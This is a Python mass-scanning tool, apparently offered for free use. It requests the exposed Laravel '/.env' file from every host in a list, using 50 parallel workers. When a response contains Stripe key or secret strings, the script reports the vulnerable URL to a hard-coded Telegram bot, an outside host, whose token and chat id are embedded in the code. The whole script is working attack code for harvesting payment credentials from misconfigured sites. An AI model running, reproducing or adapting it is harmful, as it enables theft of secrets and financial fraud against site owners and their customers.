import os, requests, time
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing import Pool
import threading
import sys
from colorama import Fore, Style

def screen_clear():
    _ = os.system('cls')


bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
res = Style.RESET_ALL
yl = Fore.YELLOW


headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}
bot_token = "1836057993:AAF4cP9qNx3gFh-epkgjBRYkALyzVs6W0gw"
id = 1196575861
def laravelcheck (star):
    if "://" in star:
      star = star
    else:
      star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + "/.env"
    check = requests.get(url, headers=headers, timeout=1)
    resp = check.text
    try:
        if "STRIPE_KEY" in resp:
        	requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={id}&text={star}/.env")
          #  print(f"Laravel {gr}OK{res} => {star}\n") and r.post(f"{ss}) 
   #         mrigel = open("Laravel.txt", "a")
 #           mrigel.write(f'{star}\n')
        elif "STRIPE_SECRET" in resp:
        	requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={id}&text={star}/.env")
        else:
            print(f"{red}Not{res} Laravel => {star}\n")
    except:
        pass

def filter(star):
    try:
       laravelcheck(star)
    except:
       pass


def main():
    print(f'''    
{gr}
░██████╗██╗░░██╗░█████╗░██████╗░██╗███████╗
██╔════╝██║░░██║██╔══██╗██╔══██╗██║██╔════╝
╚█████╗░███████║███████║██████╔╝██║█████╗░░
░╚═══██╗██╔══██║██╔══██║██╔══██╗██║██╔══╝░░
██████╔╝██║░░██║██║░░██║██║░░██║██║██║░░░░░
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░░░░

  {red} Tool By   @Srfxdz  \n
{yl}This Tool Is Totally Free If You Bought This You Got Scammed  




    ''')
    list = "list.txt"
    star = open(list, 'r').readlines()
    try:
       ThreadPool = Pool(50)
       ThreadPool.map(filter, star)
       ThreadPool.close()
       ThreadPool.join()
    except:
       pass
       
if __name__ == '__main__':
    screen_clear()
    main()
